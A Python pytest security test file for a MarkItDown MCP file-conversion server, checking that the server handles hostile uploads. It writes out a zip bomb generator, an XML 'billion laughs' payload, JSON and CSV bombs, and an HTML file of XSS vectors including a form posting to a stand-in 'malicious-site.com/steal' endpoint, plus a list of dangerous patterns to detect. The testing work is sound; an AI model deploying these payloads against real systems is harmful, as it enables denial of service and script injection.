"""
Malicious file handling security tests.
Tests server behavior with malicious file content and formats.
"""

import base64
import json
import zipfile
from pathlib import Path

import pytest

from markitdown_mcp.server import MarkItDownMCPServer, MCPRequest


class MaliciousFileGenerator:
    """Generate various types of malicious files for testing."""

    @staticmethod
    def create_zip_bomb(file_path: Path, depth: int = 10) -> str:
        """Create a zip bomb for testing."""
        # Create nested zip structure
        current_zip = file_path

        # Start with a large text file
        large_content = "A" * (1024 * 100)  # 100KB of A's

        # Create increasingly nested zips
        for i in range(depth):
            if i == 0:
                # First level: create zip with large content
                with zipfile.ZipFile(current_zip, "w", zipfile.ZIP_DEFLATED) as zf:
                    zf.writestr("large_file.txt", large_content)
            else:
                # Nested levels: zip the previous zip
                prev_zip = current_zip
                current_zip = file_path.parent / f"bomb_{i}.zip"

                with zipfile.ZipFile(current_zip, "w", zipfile.ZIP_DEFLATED) as zf:
                    zf.write(prev_zip, prev_zip.name)

        return str(current_zip)

    @staticmethod
    def create_xml_bomb(file_path: Path) -> str:
        """Create an XML billion laughs attack file."""
        xml_bomb_content = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

        file_path.write_text(xml_bomb_content, encoding="utf-8")
        return str(file_path)

    @staticmethod
    def create_json_bomb(file_path: Path) -> str:
        """Create a JSON file designed to cause excessive memory usage."""
        # Create deeply nested JSON structure
        json_data = "test"

        # Nest it deeply (reduced from 1000 to 100 to avoid Python serialization issues)
        for i in range(100):
            json_data = {"nested": json_data, "level": i}

        with open(file_path, "w") as f:
            json.dump(json_data, f)

        return str(file_path)

    @staticmethod
    def create_csv_bomb(file_path: Path) -> str:
        """Create a CSV file with excessive data."""
        # Create CSV with many columns and rows
        headers = [f"col_{i}" for i in range(1000)]

        with open(file_path, "w") as f:
            # Write header
            f.write(",".join(headers) + "\n")

            # Write many rows with long data
            for row in range(100):
                row_data = [f"data_{row}_{col}" * 10 for col in range(1000)]
                f.write(",".join(row_data) + "\n")

        return str(file_path)

    @staticmethod
    def create_html_with_scripts(file_path: Path) -> str:
        """Create HTML with potentially malicious scripts."""
        html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Malicious HTML Test</title>
    <script>
        // This is a test script that should be sanitized
        alert("XSS Test");
        document.cookie = "stolen=credentials";

        // Infinite loop attempt
        while(true) {
            console.log("CPU exhaustion attempt");
        }
    </script>
</head>
<body>
    <h1>Test HTML with Scripts</h1>
    <script>
        // Another script block
        window.location = "http://malicious-site.com";
    </script>

    <img src="x" onerror="alert('XSS via img tag')">

    <a href="javascript:alert('XSS via link')">Click me</a>

    <form action="http://malicious-site.com/steal" method="post">
        <input type="hidden" name="csrf" value="attack">
        <input type="submit" value="Submit">
    </form>

    <iframe src="javascript:alert('XSS via iframe')"></iframe>

    <div onclick="alert('XSS via onclick')">Click this div</div>
</body>
</html>"""

        file_path.write_text(html_content, encoding="utf-8")
        return str(file_path)

    @staticmethod
    def create_binary_polyglot(file_path: Path) -> str:
        """Create a file that appears to be one format but contains another."""
        # Create file that starts as valid JSON but contains binary data
        polyglot_content = b'{"legitimate": "json", "data": ['

        # Add some binary data that might confuse parsers
        polyglot_content += b"\x00\x01\x02\x03\xff\xfe\xfd\xfc"
        polyglot_content += b"PK\x03\x04"  # ZIP file signature
        polyglot_content += b"\x89PNG\r\n\x1a\n"  # PNG signature
        polyglot_content += b"%PDF-1.4"  # PDF signature

        # Close JSON structure
        polyglot_content += b"]}"

        file_path.write_bytes(polyglot_content)
        return str(file_path)

    @staticmethod
    def create_unicode_bomb(file_path: Path) -> str:
        """Create file with problematic Unicode characters."""
        # Various problematic Unicode characters
        problematic_chars = [
            "\u0000",  # Null character
            "\ufffd",  # Replacement character
            "\ufeff",  # Byte order mark
            "\u200b",  # Zero-width space
            "\u200e",  # Left-to-right mark
            "\u200f",  # Right-to-left mark
            "\u202a",  # Left-to-right embedding
            "\u202b",  # Right-to-left embedding
            "\u202c",  # Pop directional formatting
            "\u202d",  # Left-to-right override
            "\u202e",  # Right-to-left override
            "\U0001f4a9",  # Pile of poo emoji (4-byte UTF-8)
        ]

        # Create content with problematic Unicode
        content = "Unicode bomb test:\n"
        for char in problematic_chars:
            content += f"Character: {char} (U+{ord(char):04X})\n"

        # Add some text that might cause normalization issues
        content += "Normalization test: café vs café\n"  # Different Unicode representations
        content += "RTL test: \u202ehello\u202c\n"  # Right-to-left override

        file_path.write_text(content, encoding="utf-8")
        return str(file_path)


class TestMaliciousFileDetection:
    """Test detection and handling of malicious file types."""

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_zip_bomb_protection(self, temp_dir):
        """Test protection against zip bomb attacks."""
        server = MarkItDownMCPServer()
        generator = MaliciousFileGenerator()

        # Create zip bomb
        zip_bomb_path = Path(temp_dir) / "bomb.zip"
        generator.create_zip_bomb(zip_bomb_path, depth=5)

        # Test conversion
        request = MCPRequest(
            id="zip-bomb-test",
            method="tools/call",
            params={"name": "convert_file", "arguments": {"file_path": str(zip_bomb_path)}},
        )

        response = await server.handle_request(request)

        # Should either reject or handle safely without exhausting resources
        if response.result:
            # If processed, should complete quickly and not contain excessive data
            content = response.result["content"][0]["text"]
            assert len(content) < 1024 * 1024, "Zip bomb produced excessive output"
        else:
            # If rejected, should have appropriate error
            assert response.error is not None
            error_msg = response.error["message"].lower()
            # Should not crash or hang
            assert "internal error" not in error_msg

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_xml_entity_expansion_protection(self, temp_dir):
        """Test protection against XML entity expansion attacks."""
        server = MarkItDownMCPServer()
        generator = MaliciousFileGenerator()

        # Create XML bomb
        xml_bomb_path = Path(temp_dir) / "xml_bomb.xml"
        generator.create_xml_bomb(xml_bomb_path)

        # Test conversion
        request = MCPRequest(
            id="xml-bomb-test",
            method="tools/call",
            params={"name": "convert_file", "arguments": {"file_path": str(xml_bomb_path)}},
        )

        response = await server.handle_request(request)

        # Should handle XML entity expansion safely
        if response.result:
            # Should not expand entities excessively
            content = response.result["content"][0]["text"]
            assert len(content) < 1024 * 1024, "XML entity expansion not limited"
            assert "lol" not in content * 1000, "Entities may have been expanded unsafely"
        else:
            # Rejection is safer
            assert response.error is not None

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_json_recursion_protection(self, temp_dir):
        """Test protection against JSON recursion bombs."""
        server = MarkItDownMCPServer()
        generator = MaliciousFileGenerator()

        # Create JSON bomb
        json_bomb_path = Path(temp_dir) / "json_bomb.json"
        generator.create_json_bomb(json_bomb_path)

        # Test conversion
        request = MCPRequest(
            id="json-bomb-test",
            method="tools/call",
            params={"name": "convert_file", "arguments": {"file_path": str(json_bomb_path)}},
        )

        response = await server.handle_request(request)

        # Should handle deep recursion safely
        if response.result:
            # Should not cause stack overflow or excessive memory usage
            content = response.result["content"][0]["text"]
            assert len(content) < 1024 * 1024, "JSON recursion produced excessive output"
        else:
            # Error handling is acceptable
            assert response.error is not None
            error_msg = response.error["message"].lower()
            assert "recursion" in error_msg or "depth" in error_msg or "stack" in error_msg

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_csv_bomb_protection(self, temp_dir):
        """Test protection against CSV bombs."""
        server = MarkItDownMCPServer()
        generator = MaliciousFileGenerator()

        # Create CSV bomb
        csv_bomb_path = Path(temp_dir) / "csv_bomb.csv"
        generator.create_csv_bomb(csv_bomb_path)

        # Test conversion
        request = MCPRequest(
            id="csv-bomb-test",
            method="tools/call",
            params={"name": "convert_file", "arguments": {"file_path": str(csv_bomb_path)}},
        )

        response = await server.handle_request(request)

        # Should handle large CSV files reasonably
        if response.result:
            # Should not produce excessively large output
            content = response.result["content"][0]["text"]
            assert len(content) < 15 * 1024 * 1024, "CSV bomb produced excessive output"
        else:
            # Rejection due to size is acceptable
            assert response.error is not None


class TestMaliciousContentSanitization:
    """Test sanitization of malicious content in files."""

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_html_script_sanitization(self, temp_dir):
        """Test that HTML scripts are properly sanitized."""
        server = MarkItDownMCPServer()
        generator = MaliciousFileGenerator()

        # Create HTML with scripts
        html_path = Path(temp_dir) / "malicious.html"
        generator.create_html_with_scripts(html_path)

        # Test conversion
        request = MCPRequest(
            id="html-sanitize-test",
            method="tools/call",
            params={"name": "convert_file", "arguments": {"file_path": str(html_path)}},
        )

        response = await server.handle_request(request)

        if response.result:
            content = response.result["content"][0]["text"]

            # Should not contain executable script content in output
            dangerous_patterns = [
                "alert(",
                "document.cookie",
                "window.location",
                "javascript:",
                "onerror=",
                "onclick=",
                "<script",
                "<iframe",
            ]

            content_lower = content.lower()
            for pattern in dangerous_patterns:
                assert pattern not in content_lower, f"Dangerous pattern not sanitized: {pattern}"

        # Any result (success or failure) is acceptable as long as it's safe
        assert response.result is not None or response.error is not None

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_unicode_normalization_safety(self, temp_dir):
        """Test safe handling of problematic Unicode characters."""
        server = MarkItDownMCPServer()
        generator = MaliciousFileGenerator()

        # Create Unicode bomb
        unicode_path = Path(temp_dir) / "unicode_bomb.txt"
        generator.create_unicode_bomb(unicode_path)

        # Test conversion
        request = MCPRequest(
            id="unicode-safety-test",
            method="tools/call",
            params={"name": "convert_file", "arguments": {"file_path": str(unicode_path)}},
        )

        response = await server.handle_request(request)

        if response.result:
            content = response.result["content"][0]["text"]

            # Should handle Unicode safely without corruption
            assert len(content) > 0, "Unicode file produced empty output"

            # Should not contain null bytes or other problematic characters
            assert "\x00" not in content, "Output contains null bytes"

            # Should handle Unicode normalization safely
            assert "Unicode bomb test" in content, "Unicode content not preserved safely"

        # Unicode handling may fail - that's acceptable for safety
        assert response.result is not None or response.error is not None

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_binary_content_in_text_files(self, temp_dir):
        """Test handling of binary content disguised as text files."""
        server = MarkItDownMCPServer()

        # Create file with binary content but text extension
        binary_text_path = Path(temp_dir) / "binary_disguised.txt"

        # Mix of text and binary content
        mixed_content = b"This looks like text\n"
        mixed_content += b"\x00\x01\x02\x03\xff\xfe\xfd\xfc"  # Binary data
        mixed_content += b"\nMore text here\n"
        mixed_content += b"\x89PNG\r\n\x1a\n"  # PNG signature
        mixed_content += b"Final text line"

        binary_text_path.write_bytes(mixed_content)

        # Test conversion
        request = MCPRequest(
            id="binary-text-test",
            method="tools/call",
            params={"name": "convert_file", "arguments": {"file_path": str(binary_text_path)}},
        )

        response = await server.handle_request(request)

        if response.result:
            content = response.result["content"][0]["text"]

            # Should handle binary content safely
            # May strip binary parts or handle them gracefully
            assert "This looks like text" in content, "Text portions should be preserved"
            assert "More text here" in content, "Text portions should be preserved"

            # Should not crash or produce corrupted output
            assert len(content) > 0, "Should produce some output"

        # Failure to process mixed binary/text is acceptable
        assert response.result is not None or response.error is not None


class TestFileFormatSpoofing:
    """Test protection against file format spoofing attacks."""

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_extension_vs_content_mismatch(self, temp_dir):
        """Test handling of files where extension doesn't match content."""
        server = MarkItDownMCPServer()

        # Create files with mismatched extensions and content
        test_cases = [
            # JSON content with .txt extension
            ("fake.txt", '{"this": "is actually JSON", "not": "text"}'),
            # HTML content with .txt extension
            ("fake2.txt", "<html><body><h1>This is HTML</h1></body></html>"),
            # CSV content with .json extension
            ("fake.json", "Name,Age,City\nJohn,30,NYC\nJane,25,LA"),
            # XML content with .csv extension
            ("fake.csv", '<?xml version="1.0"?><root><item>XML content</item></root>'),
        ]

        for filename, content in test_cases:
            file_path = Path(temp_dir) / filename
            file_path.write_text(content)

            # Test conversion
            request = MCPRequest(
                id=f"spoofing-{filename}",
                method="tools/call",
                params={"name": "convert_file", "arguments": {"file_path": str(file_path)}},
            )

            response = await server.handle_request(request)

            # Should handle mismatched content safely
            if response.result:
                result_content = response.result["content"][0]["text"]

                # Should process based on actual content or extension
                # Either approach is acceptable as long as it's consistent and safe
                assert len(result_content) > 0, f"Should produce output for {filename}"

                # Should not crash or produce errors due to format mismatch
                if "JSON" in content:
                    # Should handle JSON content appropriately
                    pass
                elif "<html>" in content:
                    # Should handle HTML content appropriately
                    pass

            # Some format mismatches may cause errors - that's acceptable
            assert response.result is not None or response.error is not None

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_polyglot_file_handling(self, temp_dir):
        """Test handling of polyglot files (multiple format signatures)."""
        server = MarkItDownMCPServer()
        generator = MaliciousFileGenerator()

        # Create polyglot file
        polyglot_path = Path(temp_dir) / "polyglot.json"
        generator.create_binary_polyglot(polyglot_path)

        # Test conversion
        request = MCPRequest(
            id="polyglot-test",
            method="tools/call",
            params={"name": "convert_file", "arguments": {"file_path": str(polyglot_path)}},
        )

        response = await server.handle_request(request)

        # Should handle polyglot files safely
        if response.result:
            content = response.result["content"][0]["text"]

            # Should not crash or produce corrupted output
            assert len(content) >= 0, "Should handle polyglot file"

            # Should handle the legitimate parts
            if "legitimate" in content:
                assert "json" in content, "Should preserve legitimate JSON parts"

        # Failure to process polyglot is acceptable for security
        assert response.result is not None or response.error is not None


class TestBase64MaliciousContent:
    """Test handling of malicious content via base64 encoding."""

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_base64_zip_bomb(self, temp_dir):
        """Test base64-encoded zip bomb handling."""
        server = MarkItDownMCPServer()
        generator = MaliciousFileGenerator()

        # Create zip bomb
        zip_bomb_path = Path(temp_dir) / "bomb.zip"
        generator.create_zip_bomb(zip_bomb_path, depth=3)

        # Encode as base64
        zip_content = zip_bomb_path.read_bytes()
        encoded_content = base64.b64encode(zip_content).decode("ascii")

        # Test conversion via base64
        request = MCPRequest(
            id="base64-zip-bomb-test",
            method="tools/call",
            params={
                "name": "convert_file",
                "arguments": {"file_content": encoded_content, "filename": "bomb.zip"},
            },
        )

        response = await server.handle_request(request)

        # Should handle base64 zip bomb safely
        if response.result:
            content = response.result["content"][0]["text"]
            assert len(content) < 1024 * 1024, "Base64 zip bomb produced excessive output"
        else:
            # Rejection is safer
            assert response.error is not None

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_base64_malformed_data(self):
        """Test handling of malformed base64 data."""
        server = MarkItDownMCPServer()

        # Various malformed base64 strings
        malformed_base64_cases = [
            "Invalid base64!@#$%",
            "SGVsbG8gV29ybGQ=invalid",
            "SGVsbG8gV29ybGQ",  # Missing padding
            "SGVsbG8gV29ybGQ===",  # Too much padding
            "SGVs\x00bG8gV29ybGQ=",  # Null byte in base64
            "",  # Empty string
            "A",  # Too short
        ]

        for i, malformed_b64 in enumerate(malformed_base64_cases):
            request = MCPRequest(
                id=f"malformed-b64-{i}",
                method="tools/call",
                params={
                    "name": "convert_file",
                    "arguments": {"file_content": malformed_b64, "filename": "test.txt"},
                },
            )

            response = await server.handle_request(request)

            # Should handle malformed base64 gracefully
            if response.error:
                error_msg = response.error["message"].lower()
                # Should indicate base64 or decoding error
                assert any(
                    term in error_msg for term in ["base64", "decode", "invalid", "malformed"]
                )
                # Should not crash or leak system information
                assert "traceback" not in error_msg
                assert "internal error" not in error_msg

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_base64_size_limits(self):
        """Test base64 content size limits."""
        server = MarkItDownMCPServer()

        # Create very large base64 content
        large_content = "A" * (10 * 1024 * 1024)  # 10MB of A's
        encoded_content = base64.b64encode(large_content.encode()).decode()

        # Test with large base64 content
        request = MCPRequest(
            id="base64-size-test",
            method="tools/call",
            params={
                "name": "convert_file",
                "arguments": {"file_content": encoded_content, "filename": "large.txt"},
            },
        )

        response = await server.handle_request(request)

        # Should handle large base64 content appropriately
        if response.result:
            # If processed, should not cause memory issues
            content = response.result["content"][0]["text"]
            assert "A" in content, "Large content should be processed"
        else:
            # Size limits are acceptable
            assert response.error is not None
            error_msg = response.error["message"].lower()
            acceptable_errors = ["size", "large", "memory", "limit", "timeout"]
            assert any(
                term in error_msg for term in acceptable_errors
            ), f"Unexpected error: {error_msg}"


class TestResourceExhaustionProtection:
    """Test protection against resource exhaustion attacks."""

    @pytest.mark.security
    @pytest.mark.slow
    @pytest.mark.asyncio
    async def test_processing_time_limits(self, temp_dir):
        """Test that processing time is bounded."""
        import time

        server = MarkItDownMCPServer()
        generator = MaliciousFileGenerator()

        # Create files designed to take a long time to process
        time_bomb_cases = [
            # Large CSV with many columns
            ("csv_time_bomb.csv", lambda path: generator.create_csv_bomb(path)),
            # Deeply nested JSON
            ("json_time_bomb.json", lambda path: generator.create_json_bomb(path)),
        ]

        for filename, creator in time_bomb_cases:
            file_path = Path(temp_dir) / filename
            creator(file_path)

            # Measure processing time
            start_time = time.time()

            request = MCPRequest(
                id=f"time-bomb-{filename}",
                method="tools/call",
                params={"name": "convert_file", "arguments": {"file_path": str(file_path)}},
            )

            response = await server.handle_request(request)

            end_time = time.time()
            processing_time = end_time - start_time

            # Should not take excessively long (10 seconds max for test)
            assert (
                processing_time < 10
            ), f"Processing took too long: {processing_time:.2f}s for {filename}"

            # Should either succeed or fail gracefully
            assert response.result is not None or response.error is not None

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_memory_exhaustion_protection(self, temp_dir):
        """Test protection against memory exhaustion."""
        server = MarkItDownMCPServer()

        # Create file designed to use excessive memory
        memory_bomb_path = Path(temp_dir) / "memory_bomb.json"

        # Create large repetitive JSON structure
        large_array = ["memory_exhaustion_test"] * 100000  # 100k strings
        large_json = {
            "array": large_array,
            "nested": {"more_array": large_array, "deep": {"even_more": large_array}},
        }

        with open(memory_bomb_path, "w") as f:
            json.dump(large_json, f)

        # Test conversion
        request = MCPRequest(
            id="memory-bomb-test",
            method="tools/call",
            params={"name": "convert_file", "arguments": {"file_path": str(memory_bomb_path)}},
        )

        response = await server.handle_request(request)

        # Should handle memory-intensive files safely
        if response.result:
            content = response.result["content"][0]["text"]
            # Should not crash due to memory exhaustion
            assert "memory_exhaustion_test" in content
        else:
            # Memory limits are acceptable
            assert response.error is not None
            error_msg = response.error["message"].lower()
            acceptable_errors = ["memory", "size", "large", "processing"]
            assert any(
                term in error_msg for term in acceptable_errors
            ), f"Unexpected error: {error_msg}"
